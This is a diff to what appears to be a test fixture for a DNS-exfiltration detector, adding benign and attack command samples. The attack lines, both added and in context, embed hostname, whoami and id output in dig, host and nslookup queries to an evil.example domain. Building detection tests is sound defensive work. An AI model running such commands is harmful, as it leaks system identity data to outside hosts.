@@ -54,6 +54,7 @@ BENIGN = [
     ("dns-exfiltration", "echo $(date) && nslookup github.com"),
     ("dns-exfiltration", "dig +short example.com"),
     ("dns-exfiltration", "host -t txt example.com"),
+    ("dns-exfiltration", "git commit -m \"the host picked that name in its own .mcp.json\""),
 ]
 
 
@@ -90,6 +91,8 @@ ATTACKS = [
     ("dns-exfiltration", "dig +short $(hostname).evil.example"),
     ("dns-exfiltration", "host -t txt `id -u`.evil.example"),
     ("dns-exfiltration", "dig @1.1.1.1 $(whoami).evil.example"),
+    ("dns-exfiltration", "x=$(dig +short $(hostname -f).evil.example)"),
+    ("dns-exfiltration", "cd /tmp && /usr/bin/nslookup `whoami`.evil.example"),
 ]
 
 
